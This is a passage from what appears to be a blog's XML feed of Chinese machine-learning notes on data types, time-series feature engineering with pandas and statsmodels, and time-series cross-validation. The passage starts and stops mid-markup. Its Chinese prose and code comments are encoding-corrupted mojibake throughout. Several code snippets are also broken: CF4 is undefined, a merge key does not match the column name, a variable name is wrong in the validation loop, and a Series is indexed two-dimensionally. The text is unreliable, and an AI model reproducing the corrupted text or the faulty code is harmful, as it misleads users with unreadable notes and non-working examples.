Support&#x2F;typora-user-images&#x2F;image-20220310161422071.png)</p><p><strong>å®šç±»æ•°æ®</strong></p><p>å­—ç¬¦å‹ï¼Œæ­¤ç±»æ•°æ®åªä»£è¡¨â€œç±»åˆ«â€ï¼Œç±»åˆ«ä¸ç±»åˆ«ä¹‹é—´æ²¡æœ‰å¿…ç„¶çš„ç›¸å…³å…³ç³»ï¼Œæä¾›çš„ä¿¡æ¯é‡ä¹Ÿæœ€å°‘ã€‚ä¾‹å¦‚ï¼ˆé¢œè‰²ï¼šçº¢è‰²ï¼Œé»„è‰²ï¼Œè“è‰²ï¼Œç»¿è‰²ï¼‰</p><p>å¤„ç†æ–¹å¼ï¼šï½ï½ï½…ï¼ï½ˆï½ï½”ç¼–ç </p><p><strong>å®šåºæ•°æ®</strong></p><p>å­—ç¬¦å‹ï¼Œæ­¤ç±»æ•°æ®ä»£è¡¨â€œç±»åˆ«â€çš„åŒæ—¶ç±»åˆ«ä¸ç±»åˆ«ä¹‹é—´å¯ä»¥æ¯”è¾ƒï¼Œæœ‰é¡ºåºã€‚ä¾‹å¦‚ï¼ˆå“è´¨ï¼šä¼˜ï¼Œè‰¯ï¼Œä¸­ï¼Œå·®ï¼‰</p><p>å¤„ç†æ–¹å¼ï¼šå¯¹å­—ç¬¦å‹æ•°å€¼èµ‹å€¼</p><p><strong>å®šè·æ•°æ®</strong></p><p>æ•°å€¼å‹ï¼Œå¯åŠ å‡ã€‚ç”¨äºç»Ÿè®¡è®¡æ•°ã€‚ä¾‹å¦‚ï¼ˆå§å®¤æ•°é‡ï¼‰</p><p>å¤„ç†æ–¹å¼ï¼šæå·®ç¼©æ”¾ï¼Œæ ‡å‡†åŒ–</p><p><strong>å®šæ¯”æ•°æ®</strong></p><p>æ•°å€¼å‹ï¼Œå¯åŠ å‡ä¹˜é™¤ï¼Œæœ‰ç»å¯¹â€œï¼â€å€¼çš„æ¦‚å¿µã€‚ä¾‹å¦‚ï¼ˆå·¥èµ„ï¼Œï¿¥ï¼‘ï¼ï¼æ˜¯ï¿¥ï¼•ï¼çš„ï¼’å€ï¼‰</p><p>å¤„ç†æ–¹å¼ï¼šæå·®ç¼©æ”¾ï¼Œæ•°å€¼å½’ä¸€åŒ–ï¼Œæ ‡å‡†åŒ–</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœºå™¨å­¦ä¹ æ—¶é—´åºåˆ—å®æˆ˜</title>
      <link href="/2022/02/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E5%AE%9E%E6%88%98/"/>
      <url>/2022/02/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E6%99%AE%E9%80%9A%E7%9A%84%E7%89%B9%E5%BE%81">æ™®é€šçš„ç‰¹å¾</a></li><li><a href="#%E5%82%85%E9%87%8C%E5%8F%B6%E7%BA%A7%E6%95%B0">å‚…é‡Œå¶çº§æ•°</a></li><li><a href="#diff%E5%B7%AE%E5%88%86shift%E5%B9%B3%E7%A7%BBewmrolling">diffå·®åˆ†&#x2F;shiftå¹³ç§»&#x2F;ewm&#x2F;rolling</a></li><li><a href="#%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95">éªŒè¯æ–¹æ³•</a></li></ul><!-- tocstop --><h2><span id="æ™®é€šçš„ç‰¹å¾">æ™®é€šçš„ç‰¹å¾</span></h2><p><strong>ä¸è¦è®¤ä¸ºç»“æœé›†çš„monthæ²¡æœ‰å‡ºç°åœ¨è®­ç»ƒé›†å°±ä¸åŠ ï¼Œè¦ç›¸ä¿¡æ¨¡å‹çš„èƒ½åŠ›ã€‚</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ID = <span class="string">&#x27;DateTime&#x27;</span></span><br><span class="line"><span class="comment"># df[&#x27;year&#x27;] = df[ID].dt.year </span></span><br><span class="line">df[<span class="string">&#x27;month&#x27;</span>]=df[ID].dt.month</span><br><span class="line">df[<span class="string">&#x27;quarter&#x27;</span>]=df[ID].dt.quarter</span><br><span class="line">df[<span class="string">&#x27;day&#x27;</span>]=df[ID].dt.day</span><br><span class="line">df[<span class="string">&#x27;dayofweek&#x27;</span>]=df[ID].dt.dayofweek</span><br><span class="line">df[<span class="string">&#x27;dayofyear&#x27;</span>]=df[ID].dt.dayofyear</span><br><span class="line">df[<span class="string">&#x27;week&#x27;</span>]=df[ID].dt.week</span><br><span class="line">df[<span class="string">&#x27;hour&#x27;</span>]=df[ID].dt.hour</span><br><span class="line">df[<span class="string">&#x27;weekend&#x27;</span>]=df[<span class="string">&#x27;dayofweek&#x27;</span>].apply(<span class="keyword">lambda</span> x:<span class="number">1</span> <span class="keyword">if</span> x&gt;=<span class="number">5</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2><span id="å‚…é‡Œå¶çº§æ•°">å‚…é‡Œå¶çº§æ•°</span></h2><p><strong>ä½¿å¾—æœˆä»½ï¼Œå¤©æ•°ç­‰ç­‰è¿ç»­ï¼Œä¾‹å¦‚1-12æœˆï¼Œ1å’Œ12å·®è·è¿‡å¤§ï¼Œå¦‚æœä½¿ç”¨å‚…é‡Œå¶çº§æ•°çš„è¯ç›¸å½“äºå˜æˆsinæˆ–è€…cosè¡¨ç¤ºï¼Œå½¢æˆä¸€ä¸ªåœ†ã€‚</strong></p><ul><li>å…¶ä¸­<strong>fs</strong>æ˜¯çœ‹æ•°æ®çš„ï¼Œåƒè¿™ä¸ªæ•°æ®ç»™çš„æ˜¯ä¸€å°æ—¶é‡‡æ ·6æ¬¡æ•°æ®ï¼Œä¸€å¹´å°±æ˜¯1*6*24*365ï¼Œå¦‚æœæ˜¯ä¸€å¤©ä¸€é‡‡çš„æ•°æ®å°±365</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.signal <span class="keyword">import</span> periodogram</span><br><span class="line">F,S=periodogram(tr[out_cols],fs=<span class="number">1</span>*<span class="number">6</span>*<span class="number">24</span>*<span class="number">365</span>,detrend=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line">plt.plot(F,S)</span><br><span class="line">plt.xscale(<span class="string">&#x27;log&#x27;</span>)</span><br><span class="line">plt.xticks([<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">52</span>,<span class="number">104</span>,<span class="number">365</span>,<span class="number">365</span>*<span class="number">2</span>],[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;hA&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;hM&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;hW&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;hD&#x27;</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹å›¾åƒæœ€é«˜çš„å€¼ï¼Œæ—¶é—´ç›¸å…³æ€§å°±ä¼šæ¯”è¾ƒé«˜</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27;B&#x27; - business day, ie., Mon. - Fri.</span><br><span class="line">&#x27;D&#x27; - daily</span><br><span class="line">&#x27;W&#x27; - weekly</span><br><span class="line">&#x27;M&#x27; - monthly</span><br><span class="line">&#x27;A&#x27; - annual</span><br><span class="line">&#x27;Q&#x27; - quarterly</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> statsmodels.tsa.deterministic <span class="keyword">import</span> DeterministicProcess,CalendarFourier</span><br><span class="line"><span class="comment">#å‚…é‡Œå¶</span></span><br><span class="line">CF1=CalendarFourier(<span class="string">&#x27;A&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">CF2=CalendarFourier(<span class="string">&#x27;W&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">CF3=CalendarFourier(<span class="string">&#x27;D&#x27;</span>,<span class="number">4</span>)</span><br><span class="line">dp = DeterministicProcess(index=df.DateTime,additional_terms=[CF1,CF2,CF3,CF4]).in_sample()</span><br><span class="line">df = df.merge(dp,left_on=<span class="string">&#x27;datetime&#x27;</span>,right_index=<span class="literal">True</span>,how=<span class="string">&#x27;left&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_m</span>(<span class="params">m=&#123;&#125;</span>):</span><br><span class="line">    m[<span class="string">&#x27;RandomForestRegressor&#x27;</span>] = RandomForestRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;GradientBoostingRegressor&#x27;</span>] = GradientBoostingRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;ExtraTreesRegressor&#x27;</span>] = ExtraTreesRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;LGBMRegressor&#x27;</span>] = LGBMRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;LinearRegression&#x27;</span>] = LinearRegression()</span><br><span class="line">    m[<span class="string">&#x27;HuberRegressor&#x27;</span>] = HuberRegressor()</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_df</span>(<span class="params">df,name</span>):</span><br><span class="line">    train = df[:tr.shape[<span class="number">0</span>]]</span><br><span class="line">    test = df[tr.shape[<span class="number">0</span>]:]</span><br><span class="line">    x = train.drop(name,<span class="number">1</span>)</span><br><span class="line">    x_pre = test.drop(name,<span class="number">1</span>)</span><br><span class="line">    y = train[name]</span><br><span class="line">    <span class="keyword">return</span> x,y,x_pre</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_p</span>(<span class="params">l,m</span>):</span><br><span class="line">    s = l.copy()</span><br><span class="line">    s.append((<span class="string">&#x27;m&#x27;</span>,m))</span><br><span class="line">    <span class="keyword">return</span> Pipeline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_cv</span>(<span class="params">p,x,y,cv=<span class="number">5</span>,log=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(p,x,y,cv=cv).mean()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid</span>(<span class="params">p,x,y,cv=<span class="number">5</span>,log=<span class="literal">True</span></span>):</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    tss = TimeSeriesSplit(n_splits=cv)</span><br><span class="line">    <span class="keyword">for</span> tri,tei <span class="keyword">in</span> tss.split(x):</span><br><span class="line">        Xtr,Xte = x.iloc[tri,:],x.iloc[tei]</span><br><span class="line">        Ytr,Yte = y.iloc[tri],y.iloc[tei]</span><br><span class="line">        ans = p.fit(Xtr,Ytr).predict(Xte)</span><br><span class="line">        <span class="keyword">if</span> log:</span><br><span class="line">            ans = np.expm1(ans)</span><br><span class="line">        s+=r2_score(Yte,ans)</span><br><span class="line">    <span class="keyword">return</span> s/cv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_df</span>(<span class="params">l,df,name,log=<span class="literal">True</span>,s=&#123;&#125;,func=valid</span>):</span><br><span class="line">    x,y,x_pre = split_df(df,name)</span><br><span class="line">    <span class="keyword">if</span> log:</span><br><span class="line">        y = np.log1p(y)</span><br><span class="line">    <span class="keyword">for</span> n,m <span class="keyword">in</span> make_m().items():</span><br><span class="line">        p = make_p(l,m)</span><br><span class="line">        s[n] = func(p,x,y)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(s.items(),key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2><span id="diffå·®åˆ†x2fshiftå¹³ç§»x2fewmx2frolling">diffå·®åˆ†&#x2F;shiftå¹³ç§»&#x2F;ewm&#x2F;rolling</span></h2><p>ä¸»è¦ç”¨äºç‰¹å¾åˆ¶ä½œlagçš„å€¼ï¼Œå¯ä»¥å¤šå°è¯•ï¼Œtargetå€¼ä¹Ÿå¯ä»¥å°è¯•ewmï¼Œä½†æ˜¯è¿™é“é¢˜æ²¡ç”¨ã€‚</p><ul><li>diff(i)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">features =[<span class="string">&#x27;Temperature&#x27;</span>,<span class="string">&#x27;Humidity&#x27;</span>]</span><br><span class="line">rang = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> features:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rang:</span><br><span class="line">        df[<span class="string">f&#x27;<span class="subst">&#123;f&#125;</span>_lag_<span class="subst">&#123;i&#125;</span>&#x27;</span>] = df[f].diff(i).bfill()</span><br></pre></td></tr></table></figure><ul><li>rolling.mean()</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">features =[<span class="string">&#x27;Temperature&#x27;</span>,<span class="string">&#x27;Humidity&#x27;</span>]</span><br><span class="line">rang = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> features:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rang:</span><br><span class="line">        df[<span class="string">f&#x27;<span class="subst">&#123;f&#125;</span>_rolling_<span class="subst">&#123;i&#125;</span>&#x27;</span>] = df[f].rolling(i).mean().bfill()</span><br></pre></td></tr></table></figure><ul><li>ewm æ ‡ç­¾(å¯èƒ½æ•°æ®æ³„éœ²ï¼Ÿ)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ts_ft</span>(<span class="params">x, by, on</span>):</span><br><span class="line">    x.sort_values(by+[<span class="string">&#x27;dt&#x27;</span>], inplace=<span class="literal">True</span>)</span><br><span class="line">    names = [<span class="string">&#x27;mean&#x27;</span>, <span class="string">&#x27;std&#x27;</span>, <span class="string">&#x27;median&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;skew&#x27;</span>, <span class="string">&#x27;kurt&#x27;</span>]</span><br><span class="line">    sta = &#123;s:[] <span class="keyword">for</span> s <span class="keyword">in</span> names&#125;</span><br><span class="line">    alphas = [<span class="number">0.1</span>, <span class="number">0.3</span>, <span class="number">0.5</span>, <span class="number">0.7</span>, <span class="number">0.9</span>]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphas:</span><br><span class="line">        sta[<span class="string">&#x27;ewm_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a)] = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _, g <span class="keyword">in</span> x.groupby(by):</span><br><span class="line">        val = g[on]</span><br><span class="line">        rolled = val.rolling(window=<span class="built_in">len</span>(g), min_periods=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> names:</span><br><span class="line">            sta[s].extend(<span class="built_in">getattr</span>(rolled, s)().fillna(method=<span class="string">&#x27;bfill&#x27;</span>))</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> alphas:</span><br><span class="line">            ewm = val.ewm(alpha=a, adjust=<span class="literal">False</span>).mean()</span><br><span class="line">            sta[<span class="string">&#x27;ewm_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a)].extend(ewm)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> sta:</span><br><span class="line">        ft_name = <span class="string">&#x27;&#123;&#125;_on_&#123;&#125;_by_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, on, by)</span><br><span class="line">        x[ft_name] = sta[s]</span><br></pre></td></tr></table></figure><ul><li>ewm ç‰¹å¾å˜é‡</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">time_series_feature</span>(<span class="params">X,days=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> np.linspace(<span class="number">0.1</span>, <span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="comment">#     X_train[f&quot;&#123;alpha&#125;ewm_var1&quot;] = X_train[&#x27;var1&#x27;].ewm(alpha=alpha).mean()</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> [<span class="string">&#x27;temperature&#x27;</span>, <span class="string">&#x27;windspeed&#x27;</span>]:</span><br><span class="line">            X[<span class="string">f&quot;<span class="subst">&#123;alpha&#125;</span>ewm_<span class="subst">&#123;n&#125;</span>&quot;</span>] = X[n].shift(days).ewm(alpha=alpha, adjust=<span class="literal">False</span>).mean().bfill()</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> [<span class="string">&#x27;var1&#x27;</span>, <span class="string">&#x27;temperature&#x27;</span>, <span class="string">&#x27;windspeed&#x27;</span>]:</span><br><span class="line">            w = <span class="built_in">int</span>(alpha*<span class="number">20</span>)</span><br><span class="line">            <span class="comment"># rolled = X[m].shift().rolling(window=w, min_periods=1)</span></span><br><span class="line">            X[<span class="string">f&quot;<span class="subst">&#123;w&#125;</span>std_<span class="subst">&#123;m&#125;</span>&quot;</span>] = X[m].shift(days).rolling(window=w, min_periods=<span class="number">1</span>).std().bfill()</span><br><span class="line">    <span class="keyword">return</span> X</span><br></pre></td></tr></table></figure><ul><li>lagging æ ‡ç­¾ï¼ˆå¯èƒ½æ²¡å•¥ç”¨ï¼Œç¼ºå¤±å€¼å¤ªå¤šäº†ï¼‰</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_lagging</span>(<span class="params">df, df_original, i</span>):</span><br><span class="line">    df1 = df_original.copy()</span><br><span class="line">    df1[<span class="string">&#x27;visit_date&#x27;</span>] = df1[<span class="string">&#x27;visit_date&#x27;</span>] + pd.DateOffset(</span><br><span class="line">        days=i)</span><br><span class="line">    df1 = df1.rename(columns=&#123;<span class="string">&#x27;visitors&#x27;</span>: <span class="string">&#x27;lagging&#x27;</span> + <span class="built_in">str</span>(i)&#125;)</span><br><span class="line">    df2 = pd.merge(df,</span><br><span class="line">                   df1[[<span class="string">&#x27;air_store_id&#x27;</span>, <span class="string">&#x27;visit_date&#x27;</span>, <span class="string">&#x27;lagging&#x27;</span> + <span class="built_in">str</span>(i)]],</span><br><span class="line">                   on=[<span class="string">&#x27;air_store_id&#x27;</span>, <span class="string">&#x27;visit_date&#x27;</span>],</span><br><span class="line">                   how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> df2</span><br><span class="line">  </span><br><span class="line">lagging = <span class="number">21</span></span><br><span class="line">data1 = df.copy()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, lagging+<span class="number">1</span>):</span><br><span class="line">    data1 = create_lagging(data1, df, i)</span><br></pre></td></tr></table></figure><h2><span id="éªŒè¯æ–¹æ³•">éªŒè¯æ–¹æ³•</span></h2><ul><li>åªèƒ½çœ‹æ˜¯å¦æ”¹è¿›äº†ï¼Œä½†æ˜¯åˆ†æ•°åä½</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ¯æ¬¡å¾ªç¯éƒ½ä¼šå¢å¤§Xï¼Œåœ¨è¿™é¢˜æ¯”è¾ƒå‡†ç¡®ã€‚</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid</span>(<span class="params">p,X,y,cv=<span class="number">5</span></span>):</span><br><span class="line">    tss = TimeSeriesSplit(max_train_size=<span class="literal">None</span>, n_splits=cv)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> tr_i,te_i <span class="keyword">in</span> tss.split(x):</span><br><span class="line">        <span class="comment"># print(tr_i)</span></span><br><span class="line">        X_train,X_test = X.iloc[tr_i,:],X.iloc[te_i,:]</span><br><span class="line">        y_train,y_test = y.iloc[tr_i,:],y.iloc[te_i,:]</span><br><span class="line">        <span class="comment"># y_train,y_test = y.iloc[tr_i],y.iloc[te_i] yä¸ºä¸€ç»´çš„æ—¶å€™</span></span><br><span class="line">        s+=r2_score(y_test,p.fit(X_train,y_train).predict(X_test))</span><br><span class="line">    <span class="keyword">return</span> s/cv</span><br></pre></td></tr></table></figure><ul><li>ç»å…¸çš„äº¤å‰éªŒè¯åˆ†æ•°æ¯”è¾ƒé«˜ï¼Œèƒ½æŠŠæ§ä¸€ä¸‹å¤§æ¦‚æ–¹å‘å¯¹ä¸å¯¹ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">valid_cv</span>(<span class="params">p,x,y,cv=<span class="number">5</span>,log=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(p,x,y,cv=cv).mean()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  å¤§æ•°æ® pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤§æ•°æ®å»ºæ¨¡</title>
      <link href="/2022/02/14/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1/"/>
      <url>/2022/02/14/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E9%99%8D%E7%BB%B4">é™ç»´</a></li><li><a href="#npset_printoptions">np.set_printoptions</a></li><li><a href="#bicount">bicount</a></li><li><a href="#lexsort">lexsort</a></li><li><a href="#%E7%BB%83%E4%B9%A0%E9%A2%98">ç»ƒä¹ é¢˜</a></li></ul><ul><li><a href="#trick">Trick</a></li><li><a href="#matplotlib">Matplotlib</a><ul><li><a href="#%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">åŸºæœ¬æ“ä½œ</a></li><li><a href="#%E9%A3%8E%E6%A0%BC">é£æ ¼</a></li><li><a href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%94%BB%E5%9B%BE">é¢å‘å¯¹è±¡ç”»å›¾</a></li></ul></li><li><a href="#%E7%BB%93%E5%90%88pandas%E7%94%BB%E5%9B%BE">ç»“åˆpandasç”»å›¾</a></li><li><a href="#sklearn">sklearn</a><ul><li><a href="#%E5%86%B3%E7%AD%96%E6%A0%91">å†³ç­–æ ‘</a><ul><li><a href="#%E5%89%AA%E6%9E%9D%E7%AD%96%E7%95%A5">å‰ªæç­–ç•¥</a></li></ul></li><li><a href="#%E5%9B%9E%E5%BD%92%E6%A0%91">å›å½’æ ‘</a></li><li><a href="#%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97">éšæœºæ£®æ—</a></li><li><a href="#%E9%A2%84%E5%A4%84%E7%90%86">é¢„å¤„ç†</a><ul><li><a href="#%E6%96%B9%E5%B7%AE%E8%BF%87%E6%BB%A4"><strong>æ–¹å·®è¿‡æ»¤</strong></a></li><li><a href="#%E5%8D%A1%E6%96%B9%E8%BF%87%E6%BB%A4">å¡æ–¹è¿‡æ»¤</a></li><li><a href="#f%E6%A3%80%E9%AA%8C%E5%8F%AA%E8%83%BD%E6%A3%80%E9%AA%8C%E7%BA%BF%E6%80%A7%E5%85%B3%E7%B3%BB">Fæ£€éªŒï¼ˆåªèƒ½æ£€éªŒçº¿æ€§å…³ç³»ï¼‰</a></li><li><a href="#%E4%BA%92%E4%BF%A1%E6%81%AF%E6%B3%95">äº’ä¿¡æ¯æ³•</a></li></ul></li><li><a href="#%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B">ç‰¹å¾å·¥ç¨‹</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86">æ•°æ®é¢„å¤„ç†</a></li><li><a href="#%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92">é€»è¾‘å›å½’</a></li><li><a href="#perceptrons">Perceptrons</a></li><li><a href="#logisticregression">LogisticRegression</a></li></ul></li><li><a href="#%E5%81%9A%E9%A2%98%E9%81%87%E5%88%B0%E7%9A%84">åšé¢˜é‡åˆ°çš„</a><ul><li><a href="#%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%96map">æ•°æ®æ ¼å¼åŒ–map</a></li><li><a href="#%E7%B4%A2%E5%BC%95">ç´¢å¼•</a></li><li><a href="#%E5%9D%90%E6%A0%87%E8%BD%B4%E6%98%BE%E7%A4%BA%E7%99%BE%E5%88%86%E6%AF%94">åæ ‡è½´æ˜¾ç¤ºç™¾åˆ†æ¯”</a></li><li><a href="#apply">apply</a></li><li><a href="#%E9%87%8D%E9%87%87%E6%A0%B7">é‡é‡‡æ ·</a></li><li><a href="#del">del</a></li><li><a href="#%E6%8C%89%E6%97%B6%E9%97%B4%E7%AD%9B%E9%80%89">æŒ‰æ—¶é—´ç­›é€‰</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87">æ˜¾ç¤ºä¸­æ–‡</a></li><li><a 